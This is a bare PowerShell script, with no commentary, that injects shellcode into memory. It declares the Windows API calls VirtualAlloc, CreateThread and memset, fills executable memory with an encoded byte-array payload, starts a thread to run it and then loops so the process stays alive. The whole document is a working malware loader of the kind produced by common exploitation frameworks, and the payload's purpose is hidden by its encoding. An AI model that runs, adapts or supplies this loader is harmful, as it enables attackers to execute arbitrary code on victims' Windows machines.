$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x09,0x2f,0x12,0x54,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xf5,0xcd,0xe7,0xa8,0xed,0x90,0x08,0x51,0xed,0xf4,0x81,0xb4,0xdc,0x34,0xf5,0xbd,0x4e,0x85,0x7d,0x93,0x62,0x6e,0xd3,0x00,0xf1,0x02,0xfc,0x27,0xb2,0xa9,0xda,0x06,0x43,0x81,0x1f,0x08,0xc7,0xd8,0x73,0xea,0xf6,0x12,0x86,0xeb,0x3f,0x4e,0x6b,0xb9,0xe8,0x04,0xde,0x2e,0x9d,0x51,0xe3,0xc5,0xed,0x74,0x63,0x39,0xa5,0x77,0x42,0xec,0xbe,0x21,0x44,0x0e,0x13,0x5a,0xcd,0x08,0x70,0x67,0x87,0xa3,0x42,0x13,0x16,0x62,0x9b,0xdc,0xb5,0x4b,0x14,0x2f,0xc7,0x8c,0x92,0xd0,0xb2,0xe4,0xe1,0x6d,0xc5,0x32,0x98,0xa9,0x40,0xa1,0x3a,0x39,0xf2,0x0d,0xbb,0xee,0x65,0xc5,0xb7,0x5b,0xe1,0x81,0xdb,0x5a,0x26,0xba,0xe7,0xd7,0xc9,0x6d,0x6e,0xa3,0xed,0xa9,0x2b,0x77,0x8f,0xe8,0x91,0xd6,0xb0,0xeb,0x7a,0x86,0x14,0x67,0x96,0xd3,0x24,0x2a,0xfe,0x10,0x05,0xd5,0xfe,0x3e,0x1e,0xa6,0xcc,0xe1,0xb4,0x20,0x7c,0x69,0x13,0xb6,0x83,0x40,0xe3,0x28,0x7a,0x6b,0x14,0x60,0xb8,0x3f,0x44,0x1a,0x69,0x40,0x0f,0xda,0x96,0x95,0x80,0x8a,0x38,0x46,0x61,0x7b,0xf8,0x36,0x09,0x91,0xf7,0x69,0x29,0x9a,0xd2,0x01,0xc0,0x60,0xb4,0xed,0xbd,0x6b,0x28,0x86,0xbf,0x6b,0xa1,0x0a,0x49,0x8d,0xab,0xa2,0x1f,0x05,0x43,0x5a,0x3a,0xdd,0xf2,0xa3,0x90,0x9b,0x34,0x2f,0x17,0x5b,0xfa,0xd8,0x52,0x4f,0x6a,0x29,0x29,0x2d,0x3c,0x36,0x87,0x58,0xc0,0xa2,0x2c,0xcb,0x97,0x5a,0x2f,0x2a,0xdf,0xc4,0xd0,0x19,0x54,0xcc,0x44,0xe2,0x02,0x31,0x89,0xe2,0xd2,0x67,0xc3,0xe2,0xba,0xdf,0xb7,0xb0,0xdf,0x1f,0x62,0xa5,0x4c,0x8a,0x8d,0x9c,0x21,0x1d,0xe6,0x22,0x1c,0x69,0xa9,0xdd,0x4b,0x6b,0x95,0x0b,0xb5,0x19,0xf7,0x8f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};